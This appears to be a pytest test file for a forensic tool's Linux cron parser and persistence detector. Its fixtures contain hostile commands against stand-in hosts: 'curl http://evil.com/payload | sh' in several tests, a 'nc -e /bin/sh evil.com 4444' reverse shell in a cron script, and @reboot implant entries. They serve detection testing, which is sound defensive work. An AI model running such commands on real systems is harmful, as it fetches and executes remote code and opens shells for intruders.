"""Tests for Linux cron parser."""

from __future__ import annotations

from pathlib import Path

from sift_find_evil.detectors.linux_persistence import LinuxPersistenceDetector
from sift_find_evil.parsers.linux_cron import parse_cron_entries


def test_parse_system_cron_with_user_field(tmp_path: Path) -> None:
    """Parse /etc/cron.d entries (system format: schedule USER command)."""
    cron_d = tmp_path / "etc" / "cron.d"
    cron_d.mkdir(parents=True)

    # System format has user field between schedule and command
    (cron_d / "malicious").write_text(
        "# Comment to skip\n"
        "SHELL=/bin/bash\n"  # Env assignment to skip
        "*/5 * * * * root curl http://evil.com/payload | sh\n"
        "\n"  # Blank line to skip
        "0 2 * * * backup /usr/local/bin/backup.sh\n"
    )

    entries = parse_cron_entries(tmp_path)

    # Should extract only the two command lines, stripping schedule+user
    assert len(entries) == 2

    malicious = [e for e in entries if "curl" in e["line"]][0]
    assert malicious["path"] == "/etc/cron.d/malicious"
    assert malicious["line"] == "curl http://evil.com/payload | sh"

    benign = [e for e in entries if "backup.sh" in e["line"]][0]
    assert benign["path"] == "/etc/cron.d/malicious"
    assert benign["line"] == "/usr/local/bin/backup.sh"


def test_parse_user_crontab_no_user_field(tmp_path: Path) -> None:
    """Parse /var/spool/cron/crontabs entries (user format: schedule command)."""
    spool = tmp_path / "var" / "spool" / "cron" / "crontabs"
    spool.mkdir(parents=True)

    # User format has NO user field
    (spool / "root").write_text(
        "0 3 * * * /usr/bin/backup\n" "*/10 * * * * /opt/monitor.sh\n"
    )

    entries = parse_cron_entries(tmp_path)

    assert len(entries) == 2
    backup = [e for e in entries if "backup" in e["line"]][0]
    assert backup["path"] == "/var/spool/cron/crontabs/root"
    assert backup["line"] == "/usr/bin/backup"


def test_parse_etc_crontab(tmp_path: Path) -> None:
    """Parse /etc/crontab (system format with user field)."""
    etc = tmp_path / "etc"
    etc.mkdir(parents=True)

    (etc / "crontab").write_text(
        "17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n"
    )

    entries = parse_cron_entries(tmp_path)

    assert len(entries) == 1
    assert entries[0]["path"] == "/etc/crontab"
    assert entries[0]["line"] == "cd / && run-parts --report /etc/cron.hourly"


def test_parse_cron_scripts(tmp_path: Path) -> None:
    """Parse /etc/cron.{hourly,daily,weekly,monthly} executable scripts."""
    hourly = tmp_path / "etc" / "cron.hourly"
    hourly.mkdir(parents=True)

    script_content = "#!/bin/bash\nnc -e /bin/sh evil.com 4444\n"
    (hourly / "malicious-script").write_text(script_content)

    daily = tmp_path / "etc" / "cron.daily"
    daily.mkdir(parents=True)
    (daily / "backup").write_text("#!/bin/sh\n/usr/bin/backup\n")

    entries = parse_cron_entries(tmp_path)

    assert len(entries) == 2

    malicious = [e for e in entries if "nc -e" in e["line"]][0]
    assert malicious["path"] == "/etc/cron.hourly/malicious-script"
    assert malicious["line"] == script_content

    benign = [e for e in entries if "backup" in e["line"]][0]
    assert benign["path"] == "/etc/cron.daily/backup"


def test_detector_fires_on_malicious_cron(tmp_path: Path) -> None:
    """LinuxPersistenceDetector flags suspicious cron command."""
    cron_d = tmp_path / "etc" / "cron.d"
    cron_d.mkdir(parents=True)

    (cron_d / "evil").write_text("*/5 * * * * root curl http://evil.com/payload | sh\n")

    entries = parse_cron_entries(tmp_path)
    detector = LinuxPersistenceDetector()
    findings = detector.analyze({"cron_entries": entries})

    assert len(findings) == 1
    assert "Malicious cron entry" in findings[0].title
    assert "/etc/cron.d/evil" in findings[0].description
    assert "suspicious command" in findings[0].description.lower()


def test_detector_ignores_benign_cron(tmp_path: Path) -> None:
    """LinuxPersistenceDetector ignores benign cron commands."""
    spool = tmp_path / "var" / "spool" / "cron" / "crontabs"
    spool.mkdir(parents=True)

    (spool / "root").write_text("0 3 * * * /usr/bin/backup\n")

    entries = parse_cron_entries(tmp_path)
    detector = LinuxPersistenceDetector()
    findings = detector.analyze({"cron_entries": entries})

    assert len(findings) == 0


def test_mutation_check_malicious_command_change(tmp_path: Path) -> None:
    """Mutation-check: changing malicious to benign removes finding."""
    cron_d = tmp_path / "etc" / "cron.d"
    cron_d.mkdir(parents=True)

    # Start with malicious
    (cron_d / "test").write_text("*/5 * * * * root curl http://evil.com/payload | sh\n")

    entries = parse_cron_entries(tmp_path)
    detector = LinuxPersistenceDetector()
    findings = detector.analyze({"cron_entries": entries})
    assert len(findings) == 1

    # Mutate to benign
    (cron_d / "test").write_text("*/5 * * * * root /usr/bin/backup\n")

    entries_benign = parse_cron_entries(tmp_path)
    findings_benign = detector.analyze({"cron_entries": entries_benign})
    assert len(findings_benign) == 0


def test_empty_root_returns_empty_list(tmp_path: Path) -> None:
    """Parser returns empty list when no cron files exist."""
    entries = parse_cron_entries(tmp_path)
    assert entries == []


def test_multiple_cron_sources(tmp_path: Path) -> None:
    """Parser handles multiple cron sources simultaneously."""
    # Set up multiple sources
    (tmp_path / "etc" / "cron.d").mkdir(parents=True)
    (tmp_path / "etc" / "cron.d" / "a").write_text("0 * * * * root /usr/bin/hourly\n")

    (tmp_path / "var" / "spool" / "cron" / "crontabs").mkdir(parents=True)
    (tmp_path / "var" / "spool" / "cron" / "crontabs" / "user1").write_text(
        "0 0 * * * /home/user1/script.sh\n"
    )

    (tmp_path / "etc" / "cron.hourly").mkdir(parents=True)
    (tmp_path / "etc" / "cron.hourly" / "backup").write_text("#!/bin/sh\nbackup\n")

    entries = parse_cron_entries(tmp_path)

    assert len(entries) == 3
    paths = {e["path"] for e in entries}
    assert "/etc/cron.d/a" in paths
    assert "/var/spool/cron/crontabs/user1" in paths
    assert "/etc/cron.hourly/backup" in paths


def test_at_reboot_system_cron_is_captured(tmp_path: Path) -> None:
    """@reboot in /etc/cron.d (system format) is a persistence vector, not dropped."""
    cron_d = tmp_path / "etc" / "cron.d"
    cron_d.mkdir(parents=True)
    (cron_d / "persist").write_text("@reboot root /tmp/implant.sh\n")

    entries = parse_cron_entries(tmp_path)

    assert entries == [{"path": "/etc/cron.d/persist", "line": "/tmp/implant.sh"}]
    findings = LinuxPersistenceDetector().analyze({"cron_entries": entries})
    assert len(findings) == 1  # /tmp exec flagged


def test_at_reboot_user_cron_is_captured(tmp_path: Path) -> None:
    """@reboot in a per-user crontab (no USER field) is captured."""
    spool = tmp_path / "var" / "spool" / "cron" / "crontabs"
    spool.mkdir(parents=True)
    (spool / "root").write_text("@daily /usr/bin/backup.sh\n@reboot /tmp/evil\n")

    entries = parse_cron_entries(tmp_path)

    lines = {e["line"] for e in entries}
    assert lines == {"/usr/bin/backup.sh", "/tmp/evil"}


def test_cron_symlink_escape_is_contained(tmp_path: Path) -> None:
    """A cron.d symlink pointing outside the mounted root must not be read."""
    import os

    root = tmp_path / "mnt"
    (root / "etc" / "cron.d").mkdir(parents=True)
    secret = tmp_path / "host_cron"
    secret.write_text("* * * * * root curl http://evil.test/x | sh\n")
    os.symlink(secret, root / "etc" / "cron.d" / "evil")

    entries = parse_cron_entries(root)

    assert all("evil.test" not in e["line"] for e in entries)


def test_oversized_cron_file_is_skipped(tmp_path: Path) -> None:
    """A file above the size cap is skipped rather than read into memory."""
    from sift_find_evil.parsers._linux_fs import MAX_ARTIFACT_BYTES

    cron_d = tmp_path / "etc" / "cron.d"
    cron_d.mkdir(parents=True)
    big = cron_d / "huge"
    big.write_text("x" * (MAX_ARTIFACT_BYTES + 1))

    assert parse_cron_entries(tmp_path) == []
